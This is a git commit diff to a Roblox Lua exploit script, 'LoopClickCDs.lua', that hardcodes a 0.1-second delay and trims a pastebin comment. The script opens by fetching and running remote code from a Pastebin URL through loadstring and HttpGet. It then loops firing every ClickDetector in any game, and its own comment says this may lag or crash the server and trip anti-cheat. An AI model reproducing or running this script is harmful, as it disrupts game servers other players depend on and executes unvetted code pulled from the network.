8c83605995534b78efe8a9c6a5565d3b5245762f
xrt <xrtzrr@proton.me>
2024-04-06 21:23:00 -0600

    Came after awhile to edit.

--- LoopClickCDs.lua
+++ LoopClickCDs.lua
@@ -1,11 +1,11 @@
 loadstring(game:HttpGet('https://pastebin.com/raw/tZJF8g3K'))()
---< Loadstring: No loadstring. To edit wait time (local ttime), check out this pastebin first which has wait time editing along with the loadstring: https://pastebin.com/raw/cZxXthEx
+--< Loadstring: No loadstring.
 --< Game: Universal
 --< Functionality: Allows you to repeatedly loop click every single clickdetector inside a game, which might lag or crash the server. Some anti-cheat scripts built in-game may detect this.
 
 while true do
     repeat
-        wait(ttime)
+        wait(.1)
 for i,v in pairs(workspace:GetDescendants()) do
             if v:IsA("ClickDetector") then
                 fireclickdetector(v)
